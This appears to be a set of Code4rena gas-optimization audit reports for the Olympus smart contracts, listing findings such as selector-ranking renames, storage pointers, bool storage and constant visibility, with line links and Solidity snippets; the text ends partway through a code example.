https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451  Consider adding `payable` keyword.  *Save 21 gas cost*  # High effect on readability  ## [G-10] Optimise function name Every function have a keccak256 hash, this hash defines the order of the function in the contract. The best the ranking, the minimum the gas usage to access the function. Each time a function is called, the EVM need to pass through all the functions better ranked (going through a function cost 22 gas), and this operation cost gas. This can be optimized, the ranking is defined by the first four bytes of the kekkack256 hash of the function name. The name can be changed to improve the ranking, which greatly impacts the readability. That's why it's not practical to change all the names, but it's possible to change only the ones of the functions called a lot of times. This change can be done on the following functions according to their number of uses in the tests and their current ranking.  1. `Kernel.sol`: f166d9eb - `modulePermissions(bytes5,address,bytes4)` **Must outrank:** 000dd95d - `moduleDependents(bytes5,uint256)` **New name:** 00097fbb - `modulePermissions_1055(bytes5,address,bytes4)` **Rank:** 14 -> 1 *Save 286 gas each call*  2. `Kernel.sol`: c4d1f8f1 -  `executeAction(uint8,address)` **Must outrank:** 000dd95d - `moduleDependents(bytes5,uint256)` **New name:** 000a8da2 - `executeAction_11563(uint8,address)` **Rank:** 11 -> 2 *Save 198 gas each call*  3. `MINTR.sol`: 1ae7ec2e -  `KEYCODE()` **Must outrank:** 02b1d239 - `ohm()` **New name:** 00906b26 - `KEYCODE_342()` **Rank:** 2-> 1 *Save 22 gas each call*  4. `RANGE.sol`: bf30142b - `capacity(bool)` **Must outrank:** 00d16739 - `regenerate(bool,uint256)` **New name:** 00e60c55 - `capacity_81(bool)` **Rank:** 14 -> 1 *Save 286 gas each call*  5. `TRSRY.sol`: 1ae7ec2e -  `KEYCODE()` **Must outrank:** 15226b54 - `getReserveBalance(address)` **New name:** 00906b26 - `KEYCODE_342()` **Rank:** 2-> 1 *Save 22 gas each call*  6. `VOTE.sol`: 1ae7ec2e - `KEYCODE()` **Must outrank:** 06fdde03 - `name()` **New name:** 00906b26 - `KEYCODE_342()` **Rank:** 3 -> 1 *Save 44 gas each call*  7. `Governance.sol`: d1755067 - `endorseProposal(uint256)` **Must outrank:** 01153876 - `proposalHasBeenActivated(uint256)` **New name:** 007fedae - `endorseProposal_861(uint256)` **Rank:** 22 -> 1 *Save 462 gas each call*  8. `Governance.sol`: 9459b875 - `configureDependencies()` **Must outrank:** 01153876 - `proposalHasBeenActivated(uint256)` **New name:** 00aced39 - `configureDependencies_1382()` **Rank:** 18 -> 2 *Save gas each call*  9. `Operator.sol`: 7159a618 - `operate()` **Must outrank:** 01de9ba8 - `setReserveFactor(uint32)` **New name:** 000b8875 - `operate_53()` **Rank:** 18 -> 1 *Save 352 gas each call*  10. `Operator.sol`: ec7404b1 - `setActiveStatus(bool)` **Must outrank:** 01de9ba8 - `setReserveFactor(uint32)` **New name:** 00d3138f - `setActiveStatus_78(bool)` **Rank:** 31 -> 2 *Save 638 gas each call*  Consider optimizing these function names.
| | issue | | ----------- | ----------- | | 1 | [`<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (same with -= )](#1-x--y-costs-more-gas-than-x--x--y-for-state-variables-same-with) | | 2 | [can make the variable outside the loop to save gas](#2-can-make-the-variable-outside-the-loop-to-save-gas) | | 3 | [`++i` costs less gas than `i++`, especially when it’s used in for-loops (--i/i-- too)](#3-i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too) | | 4 | [it costs more gas to initialize non-constant/non-immutable variables to zero than to let the default of zero be applied](#4-it-costs-more-gas-to-initialize-non-constantnon-immutable-variables-to-zero-than-to-let-the-default-of-zero-be-applied) | | 5 | [using `calldata` instead of `memory` for read-only arguments in external functions saves gas](#5-using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas) | | 6 | [using `bools` for storage incurs overhead](#6-using-bools-for-storage-incurs-overhead) | | 7 | [internal functions only called once can be inlined to save gas](#7-internal-functions-only-called-once-can-be-inlined-to-save-gas) | | 8 | [usage of uint/int smaller than 32 bytes (256 bits) incurs overhead](#8-usage-of-uintint-smaller-than-32-bytes-256-bits-incurs-overhead) | | 9 | [using private rather than public for constants, saves gas](#9-using-private-rather-than-public-for-constants-saves-gas) | | 10 | [not using the named return variables when a function returns, wastes deployment gas](#10-not-using-the-named-return-variables-when-a-function-returns-wastes-deployment-gas) | | 11 | [state variables only set in the constructor should be declared](#11-state-variables-only-set-in-the-constructor-should-be-declared) | | 12 | [`<array>.length` should not be looked up in every loop of a for-loop](#12-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop) |    ## 1. `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (same with -= )  - [PRICE.sol#L136](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136) - [PRICE.sol#L138](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138) - [PRICE.sol#L222](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222)  - [TRSRY.sol#L96](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96) - [TRSRY.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97) - [TRSRY.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115) - [TRSRY.sol#L116](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116) - [TRSRY.sol#L131](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131) - [TRSRY.sol#L132](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L132)  - [VOTES.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L56) - [VOTES.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58)  - [Governance.sol#L198](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198) - [Governance.sol#L252](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252) - [Governance.sol#L254](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254)  - [BondCallback.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143) - [BondCallback.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144)  - [Heart.sol#L103](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103)   ## 2. can make the variable outside the loop to save gas  - [KernelUtils.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L44) - [KernelUtils.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L59)   ## 3. `++i` costs less gas than `i++`, especially when it’s used in for-loops (--i/i-- too)  Saves 6 gas per loop  - [KernelUtils.sol#L49](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49) - [KernelUtils.sol#L64](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64)  - [Operator.sol#L488](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488) - [Operator.sol#L670](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670) - [Operator.sol#L675](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L675) - [Operator.sol#L686](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686) - [Operator.sol#L691](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L691)   ## 4. it costs more gas to initialize non-constant/non-immutable variables to zero than to let the default of zero be applied  - [Kernel.sol#L397](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L397)  - [KernelUtils.sol#L43](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L44) - [KernelUtils.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L59)   ## 5. using `calldata` instead of `memory` for read-only arguments in external functions saves gas  - [PRICE.sol#L205](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205)  - [Governance.sol#L159](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L159)  - [PriceConfig.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45)  - [TreasuryCustodian.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53)  - [BondCallback.sol#L152](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L152)   ## 6. using `bools` for storage incurs overhead  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from ‘false’ to ‘true’, after having been ‘true’ in the past  - [PRICE.sol#L62](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L62)  - [RANGE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L127) - [RANGE.sol#L184](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L184) - [RANGE.sol#L216](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L216) - [RANGE.sol#L281](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L281) - [RANGE.sol#L291](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L291) - [RANGE.sol#L302](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L302) - [RANGE.sol#L320](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L320) - [RANGE.sol#L330](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L330) - [RANGE.sol#L340](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L340)  - [Kernel.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L113) - [Kernel.sol#L126](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L126) - [Kernel.sol#L181](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L181) - [Kernel.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L194) - [Kernel.sol#L197](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L197) - [Kernel.sol#L394](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L394)  - [Governance.sol#L105](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L105) - [Governance.sol#L117](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L117) - [Governance.sol#L240](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240)  - [BondCallback.sol#L24](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L24)  - [Heart.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L33)  - [Operator.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L63) - [Operator.sol#L66](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L66) - [Operator.sol#L363](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L363) - [Operator.sol#L473](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L473) - [Operator.sol#L618](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L618) - [Operator.sol#L634](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L634) - [Operator.sol#L699](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L699) - [Operator.sol#L732](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L732) - [Operator.sol#L735](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L735) - [Operator.sol#L778](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L778)   ## 7. internal functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  - [Kernel.sol#L266](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L266) - [Kernel.sol#L279](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L279) - [Kernel.sol#L295](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L295) - [Kernel.sol#L325](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325) - [Kernel.sol#L351](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L351) - [Kernel.sol#L378](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L378) - [Kernel.sol#L409](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L409)  - [Heart.sol#L111](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L111)  - [Operator.sol#L652](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L652)   ## 8. usage of uint/int smaller than 32 bytes (256 bits) incurs overhead  When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed  - [PRICE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44) - [PRICE.sol#L47](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47) - [PRICE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127) - [PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185) - [PRICE.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50) - [PRICE.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53) - [PRICE.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56) - [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59) - [PRICE.sol#L75](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75) - [PRICE.sol#L76](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L76) - [PRICE.sol#L205](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205) - [PRICE.sol#L240](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240) - [PRICE.sol#L266](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266) - [PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185) - [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59) - [PRICE.sol#L84](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84) - [PRICE.sol#L87](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87)  - [PriceConfig.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45) - [PriceConfig.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L58) - [PriceConfig.sol#L69](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L69)  - [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89) - [Operator.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L97) - [Operator.sol#L516](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516) - [Operator.sol#L528](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L528) - [Operator.sol#L529](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L529) - [Operator.sol#L530](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L530) - [Operator.sol#L548](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548) - [Operator.sol#L560](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L560) - [Operator.sol#L561](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L561) - [Operator.sol#L562](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L562) - [Operator.sol#L665](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L665) - [Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83) - [Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86) - [Operator.sol#L418](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L418)   ## 9. using private rather than public for constants, saves gas  If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that returns a tuple of the values of all currently-public constants. Saves 3406-3606 gas in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it’s used, and not adding another entry to the method ID table  - [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59)  - [RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65)  - [Governance.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121) - [Governance.sol#L124](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124) - [Governance.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127) - [Governance.sol#L130](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130) - [Governance.sol#L133](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133) - [Governance.sol#L137](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137)  - [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89)   ## 10. not using the named return variables when a function returns, wastes deployment gas  - [INSTR.sol#L28](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28)  - [MINTR.sol#L25](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25)  - [PRICE.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113)  - [Kernel.sol#L100](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100)  - [TRSRY.sol#L51](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51)  - [RANGE.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115)  - [VOTES.sol#L27](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27)  - [BondCallback.sol#L177](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L177)   ## 11. state variables only set in the constructor should be declared   avoids a gsset (20000 gas)  - [Heart.sol#L48](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L48)  - [BondCallback.sol#L28](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L28) - [BondCallback.sol#L32](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32)   ## 12. `<array>.length` should not be looked up in every loop of a for-loop  This reduce gas cost as show here https://forum.openzeppelin.com/t/a-collection-of-gas-optimisation-tricks/19966/5  - [Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)  
##### Summary  Gas savings are estimated using the gas report of existing `FORGE_GAS_REPORT=true forge test` tests (the sum of all deployment costs and the sum of the costs of calling all methods) and may vary depending on the implementation of the fix. I keep my version of the fix for each finding and can provide them if you need. Some optimizations (mostly logical) cannot be scored with a exact gas quantity.  Gas Optimizations ||Issue|Instances|Estimated gas(deployments)|Estimated gas(method call)| |:---:|:---|:---:|:---:|:---:| |**1**|Replace `modifier` with `function`|6|460 154|-| |**2**|`storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping`|7|188 639|5 032| |**3**|Using `private` rather than `public` for constants, saves gas|8|45 857|308| |**4**|Use elementary types or a user-defined `type` instead of a `struct` that has only one member|1|30 714|1 037| |**5**|State variables should be cached in stack variables rather than re-reading them from storage|7|24 021|614| |**6**|Using bools for storage incurs overhead|6|23 611|4 485| |**7**|State variables can be packed into fewer storage slots|3|23 292|1 711| |**8**|Expressions that cannot be overflowed can be unchecked|5|23 016|-| |**9**|Increment optimization|18|↓|↓| |**9.1**|Prefix increments are cheaper than postfix increments, especially when it's used in for-loops|3|400|-| |**9.2**|`<x> = <x> + 1` even more efficient than pre increment|18|14 217|-| |**10**|Use named `returns` for local variables where it is possible|3|5 400|-| |**11**|`x = x + y` is cheaper than `x += y;`|6|5 000|-| |**12**|Deleting a struct is cheaper than creating a new struct with null values.|1|4 207|-| |**13**|Don't compare boolean expressions to boolean literals|2|1 607|-| |**14**|`revert` operator should be in the code as early as reasonably possible|3|200|1 559+| |**15**|Duplicated require()/revert() checks should be refactored to a modifier or function|4|-|8 111|  **Total: 83 instances over 15 issues**  ---  1. **Replace `modifier` with `function` (6 instances)**     modifiers make code more elegant, but cost more than normal functions     Deployment Gas Saved: **460 154**     All modifiers except `permissioned` due to unresolved error flow     - src/Kernel.sol:[70-73](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L70-L73), [119-123](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L119-L123), [223-232](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L223-L232)     ```solidity    70     modifier onlyKernel() {    71         if (msg.sender != address(kernel)) revert KernelAdapter_OnlyKernel(msg.sender);    72         _;    73     }    ...    119    modifier onlyRole(bytes32 role_) {    120        Role role = toRole(role_);    121        if (!kernel.hasRole(msg.sender, role)) revert Policy_OnlyRole(role);    122        _;    123    }    ...    223    modifier onlyExecutor() {    224        if (msg.sender != executor) revert Kernel_OnlyExecutor(msg.sender);    225        _;    226    }    227    228    /// @notice Modifier to check if caller is the roles admin.    229    modifier onlyAdmin() {    230        if (msg.sender != admin) revert Kernel_OnlyAdmin(msg.sender);    231        _;    232    }    ```     - src/policies/Operator.sol:[188-191](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191)     ```solidity    188    modifier onlyWhileActive() {    189        if (!active) revert Operator_Inactive();    190        _;    191    }    ```     - [src/modules/PRICE.sol](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol)     ```solidity    if (!initialized) revert Price_NotInitialized(); // @note 4 instances    ```  2. **`storage` pointer to a structure is cheaper than copying each value of the structure into `memory`, same for `array` and `mapping` (7 instances)**     Deployment Gas Saved: **188 639**    Method Call Gas Saved: **5 032**     It may not be obvious, but every time you copy a storage `struct`/`array`/`mapping` to a `memory` variable, you are literally copying each member by reading it from `storage`, which is expensive. And when you use the `storage` keyword, you are just storing a pointer to the storage, which is much cheaper.     - src/Kernel.sol:[379](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L379)     ```solidity    379        Policy[] memory dependents = moduleDependents[keycode_];    ```     fix(the same for others):     ```solidity    Policy[] storage dependents = moduleDependents[keycode_];    ```     - src/policies/BondCallback.sol:[179](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L179)     ```solidity    179        uint256[2] memory marketAmounts = _amountsPerMarket[id_];    ```     - src/policies/Governance.sol:[206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L206)     ```solidity    206        ProposalMetadata memory proposal = getProposalMetadata[proposalId_];    ```     - src/policies/Operator.sol:[205-206](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L205-L206), [384-385](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L384-L385), [439-440](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L439-L440), [666](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L666)     ```solidity    205        /// Cache config in memory    206        Config memory config_ = _config;    ...    384            /// Cache config struct to avoid multiple SLOADs    385            Config memory config_ = _config;    ...    439            /// Cache config struct to avoid multiple SLOADs    440            Config memory config_ = _config;    ...    666        Regen memory regen = _status.low;    ```  3. **Using `private` rather than `public` for constants, saves gas (8 instances)**     If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table     Deployment Gas Saved: **45 857**    Method Call Gas Saved: **308**     - src/policies/Governance.sol:[119-137](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L119-L137)     ```solidity    119    /// @notice The amount of votes a proposer needs in order to submit a proposal as a percentage of total supply (in basis points).    120    /// @dev    This is set to 1% of the total supply.    121    uint256 public constant SUBMISSION_REQUIREMENT = 100;    122    123    /// @notice Amount of time a submitted proposal has to activate before it expires.    124    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;    125    126    /// @notice Amount of time an activated proposal must stay up before it can be replaced by a new activated proposal.    127    uint256 public constant GRACE_PERIOD = 1 weeks;    128    129    /// @notice Endorsements required to activate a proposal as percentage of total supply.    130    uint256 public constant ENDORSEMENT_THRESHOLD = 20;    131    132    /// @notice Net votes required to execute a proposal on chain as a percentage of total supply.    133    uint256 public constant EXECUTION_THRESHOLD = 33;    134    135    /// @notice Required time for a proposal to be active before it can be executed.    136    /// @dev    This amount should be greater than 0 to prevent flash loan attacks.    137    uint256 public constant EXECUTION_TIMELOCK = 3 days;    ```     - src/policies/Operator.sol:[89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L89)     ```solidity    89     uint32 public constant FACTOR_SCALE = 1e4;    ```     - src/modules/RANGE.sol:[65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L65)     ```solidity    65     uint256 public constant FACTOR_SCALE = 1e4;    ```  4. **Use elementary types or a user-defined `type` instead of a `struct` that has only one member. (1 instances)**     Deployment Gas Saved: **30 714**    Method Call Gas Saved: **1 037**     - src/modules/RANGE.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L33-L35)     ```solidity    33     struct Line {    34         uint256 price; // Price for the specified level    35     }    ```  5. **State variables should be cached in stack variables rather than re-reading them from storage**     Deployment Gas Saved: **24 021**    Method Call Gas Saved: **614**     SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.     - src/policies/Heart.sol:[112-113](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L112-L113)     ```solidity    112        rewardToken.safeTransfer(to_, reward);    113        emit RewardIssued(to_, reward);    ```     fix:     ```solidity            uint256 reward = reward;            rewardToken.safeTransfer(to_, reward);            emit RewardIssued(to_, reward);    ```     - src/policies/BondCallback.sol:[68-75](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L68-L75)     ```solidity    68         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();    69         Keycode MINTR_KEYCODE = MINTR.KEYCODE();    70    71         requests = new Permissions[](4);    72         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);    73         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.withdrawReserves.selector);    74         requests[2] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);    75         requests[3] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);    ```     fix(similar for other policies):     ```solidity        OlympusTreasury ltrsry = TRSRY;        OlympusMinter lmintr = MINTR;        Keycode TRSRY_KEYCODE = ltrsry.KEYCODE();        Keycode MINTR_KEYCODE = lmintr.KEYCODE();         requests = new Permissions[](4);         requests[0] = Permissions(TRSRY_KEYCODE, ltrsry.setApprovalFor.selector);        requests[1] = Permissions(TRSRY_KEYCODE, ltrsry.withdrawReserves.selector);        requests[2] = Permissions(MINTR_KEYCODE, lmintr.mintOhm.selector);        requests[3] = Permissions(MINTR_KEYCODE, 